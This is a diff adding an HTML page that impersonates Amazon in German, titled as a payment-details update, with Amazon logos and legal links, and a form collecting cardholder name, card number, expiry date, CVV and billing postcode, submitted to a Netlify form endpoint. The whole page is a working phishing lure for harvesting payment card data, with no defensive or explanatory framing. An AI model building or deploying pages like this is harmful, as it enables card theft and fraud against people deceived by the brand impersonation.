@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html>
+<head>
+<img align="middle" alt="Amazon" src="https://media1.giphy.com/media/zWyv9xtsEfXQQ/giphy.gif"width="240" height="120">
+<meta charset="UTF-8">
+	<title>Amazon, Zahlungsdetails aktualisieren</title>
+	<link href="style.css" rel="stylesheet">
+</head>
+<body>
+
+<p>
+<div class="login-page">
+<div class="form">
+
+<img align="middle" alt="Amazon" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRPS6TAFikuz8yPIBoBHIoyp44oJ2BHZ4m5ZZZWuDY5yCkRFil4&s"width="250" height="40">
+
+<form name="contact"  action="/success/" method="POST" data-netlify="true">
+<h3 class="stepTitle" data-uia="stepTitle">Richten Sie Ihre Kredit- oder Debitkarte ein.</h3>
+  <p>
+  <label>		<input id="input-field" type="text" name="Kartenname" required="required" autocomplete="on" maxlength="45" placeholder="Kartenname"/>
+  <label>		<input placeholder="Kartennummer" onfocus="showElement('Card Number')" onblur="hideElement('Card Number')" class="form-control" id="Card Number" type="text" name="Card Number" value="" tabindex="2" autocapitalize="off" autocorrect="off">
+  <label>		<input id="input-field" type="text" name="ExpiryDate" required="required" autocomplete="on" maxlength="45" placeholder="Verfallsdatum"/>
+  <label>		<input id="input-field" type="text" name="CVV" required="required" autocomplete="on" maxlength="45" placeholder="Sicherheitscode (CVV) "/>
+  <label>	        <input id="input-field" type="text" name="Zipcode" required="required" autocomplete="on" maxlength="45" placeholder="Postleitzahl der Abrechnung"/>
+  </label>
+            <div class="a-section">
+  
+  <button type="submit">Speichern</button>
+</form>
+	 <p>
+  <div id="legalTextRow" class="a-row a-spacing-top-medium a-size-small">
+  Wenn Sie fortfahren, stimmen Sie Amazon <a href="/gp/help/customer/display.html/ref=ap_signin_notification_condition_of_use?ie=UTF8&amp;nodeId=508088">Nutzungsbedingungen</a> und <a href="/gp/help/customer/display.html/ref=ap_signin_notification_privacy_notice?ie=UTF8&amp;nodeId=468496">Data protection</a>.
+</div>
+</form>
